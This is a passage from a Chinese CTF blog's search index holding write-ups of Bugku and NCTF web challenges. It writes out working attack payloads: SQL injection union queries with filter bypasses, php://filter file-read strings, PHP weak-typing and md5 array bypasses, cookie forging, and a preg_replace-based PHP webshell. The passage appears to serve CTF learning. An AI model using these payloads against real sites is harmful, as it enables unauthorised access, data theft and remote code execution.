g=&quot;h/1-1.k&quot;&gt;\\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;, [], 38, &#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;.split(&#x27;|&#x27;), 0, &#123;&#125;) 删除eval在浏览器的控制台跑出的结果 在线代码格式化后如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function getCookie(cname) &#123; var name = cname + &quot;=&quot;; var ca = document.cookie.split(&#x27;;&#x27;); for (var i = 0; i &lt; ca.length; i++) &#123; var c = ca[i].trim(); if (c.indexOf(name) == 0) return c.substring(name.length, c.length) &#125; return &quot;&quot;&#125;function decode_create(temp) &#123; var base = new Base64(); var result = base.decode(temp); var result3 = &quot;&quot;; for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num) &#125; return result3&#125;function ertqwe() &#123; var temp_name = &quot;user&quot;; var temp = getCookie(temp_name); temp = decodeURIComponent(temp); var mingwen = decode_create(temp); var ca = mingwen.split(&#x27;;&#x27;); var key = &quot;&quot;; for (i = 0; i &lt; ca.length; i++) &#123; if (-1 &lt; ca[i].indexOf(&quot;flag&quot;)) &#123; key = ca[i + 1].split(&quot;:&quot;)[2] &#125; &#125; key = key.replace(&#x27;&quot;&#x27;, &quot;&quot;).replace(&#x27;&quot;&#x27;, &quot;&quot;); document.write(&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-2.jpg&quot; &#125;, 1000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-3.jpg&quot; &#125;, 2000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-4.jpg&quot; &#125;, 3000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/6.png&quot; &#125;, 4000); setTimeout(function () &#123; alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot; + md5(key) + &quot;&#125;&quot;) //发现了flag字段 &#125;, 5000)&#125; 首先在控制台中获取cookie 12getCookie(&quot;user&quot;); 获取cookie，使用上面的js代码一步一步解码 最后会获取序列化后的一串字符串 最后解出来的cookie值 1O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:615;s:5:&quot;neili&quot;;i:657;s:5:&quot;lidao&quot;;i:76;s:6:&quot;dingli&quot;;i:72;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:0;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125; 但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag 改cookie的方法就是将明文逆向编码： 刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。猜想一定是base64.js有问题： 发现加密过程并不对应，encode调用了_utf8_encode但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改 修改后的反编码过程，将其放到html文件中，浏览器运行即可出结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141//1.html&lt;script&gt;function Base64() &#123; // private property _keyStr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;; // public method for encoding this.encode = function (input) &#123; var output = &quot;&quot;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; //input = _utf8_encode(input); (注释掉这个函数调用) while (i &lt; input.length) &#123; chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 &gt;&gt; 2; enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4); enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6); enc4 = chr3 &amp; 63; if (isNaN(chr2)) &#123; enc3 = enc4 = 64; &#125; else if (isNaN(chr3)) &#123; enc4 = 64; &#125; output = output + _keyStr.charAt(enc1) + _keyStr.charAt(enc2) + _keyStr.charAt(enc3) + _keyStr.charAt(enc4); &#125; return output; &#125; // public method for decoding this.decode = function (input) &#123; var output = &quot;&quot;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, &quot;&quot;); while (i &lt; input.length) &#123; enc1 = _keyStr.indexOf(input.charAt(i++)); enc2 = _keyStr.indexOf(input.charAt(i++)); enc3 = _keyStr.indexOf(input.charAt(i++)); enc4 = _keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4); chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2); chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) &#123; output = output + String.fromCharCode(chr2); &#125; if (enc4 != 64) &#123; output = output + String.fromCharCode(chr3); &#125; &#125; //output = _utf8_decode(output); return output; &#125; // private method for UTF-8 encoding _utf8_encode = function (string) &#123; string = string.replace(/\\r\\n/g,&quot;\\n&quot;); var utftext = &quot;&quot;; for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; utftext += String.fromCharCode(c); &#125; else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; utftext += String.fromCharCode((c &gt;&gt; 6) | 192); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; else &#123; utftext += String.fromCharCode((c &gt;&gt; 12) | 224); utftext += String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; &#125; return utftext; &#125; // private method for UTF-8 decoding _utf8_decode = function (utftext) &#123; var string = &quot;&quot;; var i = 0; var c = c1 = c2 = 0; while ( i &lt; utftext.length ) &#123; c = utftext.charCodeAt(i); if (c &lt; 128) &#123; string += String.fromCharCode(c); i++; &#125; else if((c &gt; 191) &amp;&amp; (c &lt; 224)) &#123; c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); i += 2; &#125; else &#123; c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); i += 3; &#125; &#125; return string; &#125;&#125;//原来cookievar temp = &quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;;//进行加密，获取明文var base = new Base64();var result = base.decode(temp);var result3 = &quot;&quot;;for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num);&#125; document.write(&quot;原明文：&quot;+result3+&#x27;&lt;br/&gt;&#x27;);document.write(&#x27;&lt;br/&gt;&#x27;);var result3 = &#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;;//反编码获取cookievar result = &quot;&quot;;for (i = 0;i&lt;result3.length;i++)&#123; num = result3[i].charCodeAt(); num = num + ((i % 10) + 2); num = num ^ i; result += String.fromCharCode(num);&#125;var temp= base.encode(result);//将cookie进行url编码temp = encodeURIComponent(temp);document.write(&quot;cookie:&quot;+temp+&quot;&lt;/br&gt;&quot;);&lt;/script&gt; 编码结果 1UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo%2FBTzBxKbu6fbrB%2BH%2Bps3nsLrP6dCs0LgR8fj1%2F%2B6y3%2B%2FapJ3XnJnkjNPf0NnRjpPD7paIiIiIhovBiIL4kNTK0dea%2F7mC%2B4bu%2FOr1SQ%3D%3D 这就是我们期待的cookie,然后用工具修改cookie 修满属性值打怪拿到flag 参考 这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。","tags":[{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"编码","slug":"编码","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugku刷题记录1 web2查看源码即可 计算器修改前端代码 GETpayload: ?what=flag POST12POST:what=flag 矛盾payload: ?num=1a 考察点：弱类型比较 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 测试代码 1234567&lt;?phpvar_dump(&quot;admin&quot;==0); //truevar_dump(&quot;1admin&quot;==1); //truevar_dump(&quot;admin1&quot;==1) //falsevar_dump(&quot;admin1&quot;==0) //truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true?&gt; //上述代码可自行测试 1231 观察上述代码，&quot;admin&quot;==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等2 &quot;1admin&quot;==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是&quot;admin1&quot;被转化成了0,为什么呢？？3 &quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 web3查看源码后，在最下面看到一串编码，为unicode编码 1&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 使用工具转换为字符串 域名解析dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名 hosts就是本地用来解析域名为IP 因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问 （hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts） 路径为： 1C:\\Windows\\System32\\drivers\\etc 文件保存后在浏览器中访问该域名 获得flag 你必须让他停下打开页面什么也没有，源码也没有什么发现，抓包试试 go完也没什么反应，有点迷惑 但是多go几次后，发现有张图片在变 多go几次就出来了flag,原理还未知 变量1123456789101112 &lt;?php error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#x27;args&#x27;]))&#123; $args = $_GET[&#x27;args&#x27;]; if(!preg_match(&quot;/^\\w+$/&quot;,$args))&#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;);&#125;?&gt; 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 GLOBALS:一个包含了全部变量的全局组合数组 即将include”flag.php”作为全局变量在本页面输出 ?args=GLOBALS web5源码中一串特别的代码jsfuck, 直接放在浏览器的控制台中运行 头等舱打开页面什么也没有 扫描目录，扫出来一大堆没用的，直接抓包 。。。。就出来了 网站被黑名字提示了，网站被黑。 打开题目，发现鼠标动不了，可能是被黑后的后遗症 先扫描目录发现了shell.php,这可能是上次黑客留下的小马文件 打开页面，需要密码，这就需要爆破了(密码为hack) 确定要爆破的变量 加载密码字典 出现结果（根据length确定密码） 密码为hack 登录即可 管理员系统随便输入一个账号发现提示IP 想到了X-FORWORADED-FOR:127.0.0.1 抓包试试 在响应包中发现一段base64编码dGVzdDEyMw== 解密后为test123，猜测为登录密码 结果真对了 当然这题也可以使用爆破的方法做，但是密码字典需要包含test123 web4查看源码发现一段js代码 将最后的eval改成alert(),直接在浏览器中运行弹出结果 12345678910function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) 直接输入67d709b2b54aa2aa648cf6e87a7114f1 flag在index里题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有 注意到了url:http://123.206.87.240:8005/post/index.php?file=show.php 出现file这个参数，想到了文件包含的漏洞 用下面的payload,获取index.php，源码的base64值 ?file=php://filter/read=convert.base64-encode/resource=index.php 1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 解码为 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 获取flag{edulcni_elif_lacol_si_siht} 请输入密码提示了5位数的密码，直接爆破，可用burpsuit的爆破模块 备份是个好习惯打开题目后，出现一段代码，应该是md5值，可是解码为空密码 扫描目录python dirsearch.py -u http://123.206.87.240:8002/web16/ -e php 发现了index.php.bak 这个应该是在编辑这个文件时，自动生成的备份文件；EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；如果编辑后没有什么问题；可以删除.BAK文件 (来自百度) 下载.bak文件打开后，发现源码，开始审计 12345678910111213141516171819202122&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);//对key进行了过滤parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;//这里需要使用md()函数对数组处理时的漏洞 echo $flag.&quot;取得flag&quot;;&#125;?&gt; url:http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a成绩单打开页面像是注入的题目 测试一些 121&#x27; and 1=1 # 1&#x27; and 1=2 # 第一个语句正常，第二个语句不显示内容，可以判断存在注入点 1.判断字段数11&#x27; order by 4 # 2.爆数据库-1&apos; union select 1,database(),3,4 # database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag 1(select skctf_flag from skctf_flag.fl4g) 秋名山车神看到题目就知道需要用python的脚本来做 123456789101112import requestsimport reurl=&#x27;http://120.24.86.145:8002/qiumingshan/&#x27;r=requests.session()requestpage = r.get(url)ans=re.findall(&#x27;&lt;div&gt;(.*?)=?;&lt;/div&gt;&#x27;,requestpage.text)#获取表达式ans=&quot;&quot;.join(ans)#列表转为字符串ans=ans[:-2]#去掉最后的=?post=eval(ans)#计算表达式的值data=&#123;&#x27;value&#x27;:post&#125;#构造post的data部分flag=r.post(url,data=data)print(flag.text)","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"域名解析","slug":"域名解析","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"爆破","slug":"爆破","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取about.php 123456789101112131415161718&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit();&#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125;&#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 1234567891011121314151617181920212223&lt;?php //so.phpif($_SERVER[&#x27;HTTP_USER_AGENT&#x27;]!=&quot;Xlcteam Browser&quot;)&#123; //必须修改http头，吧user-agent改成Xlcteam Browserecho &#x27;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#x27;; exit();&#125;$id=$_POST[&#x27;soid&#x27;]; //post 一个soidinclude &#x27;config.php&#x27;;include &#x27;antiinject.php&#x27;; //防注入的文件include &#x27;antixss.php&#x27;; //防xss的文件 $id=antiinject($id); //对id过滤$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;); //sql查询，可能存在注入点$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&#x27;nice&#x27;]).&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;.antixss($rs[&#x27;say&#x27;]).&#x27;&lt;br /&gt;&#x27;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 123456789101112&lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&#x27; &#x27;,&quot;&#x27;&quot;,&quot;;&quot;,&#x27;&quot;&#x27;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], &#x27;&#x27;,$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 1(sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 12345 &lt;?php $e = $_REQUEST[&#x27;www&#x27;]; $arr = array($_POST[&#x27;wtf&#x27;] =&gt; &#x27;|.*|e&#x27;,); array_walk($arr, $e, &#x27;&#x27;); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQL注入1题目源码给出 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; echo &#x27;&lt;/br&gt;&#x27;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 首先post方法传递user和pass两个参数，然后带入sql语句中查询 注入点在这个位置 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) 构造语句 select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) 在username中填入admin&#39;) or 1=1 #或者admin&#39;) and 1=1 #，提交即可获得flag passcheck12345678910111213$pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; strcmp() 函数比较两个字符串。 注释：strcmp() 函数是二进制安全的，且对大小写敏感。 提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。 只有pass==pass1时才显示flag 感觉跟之前的变量覆盖相似 知识点： strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0； hackbar的使用，post方法 php弱类型，数组的使用。 参考： https://www.cnblogs.com/islsy/p/10667426.html 起名字真难123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //number中的数字不能在1-9 &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;; //number的值等于54975581388，与之前if语句矛盾&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 尝试将54975581388转成十六进制 0xccccccccc, c的a值为12，满足if判断语句 ?key=0xccccccccc sqlinject查看源码 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //防止注入 $str=stripslashes($str); //添加 \\ &#125; return htmlentities($str, ENT_QUOTES);//过滤掉单引号，双引号，或者兼而有之&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);//对获取的参数进行了处理$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;//存在注入的语句$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag;--&gt; 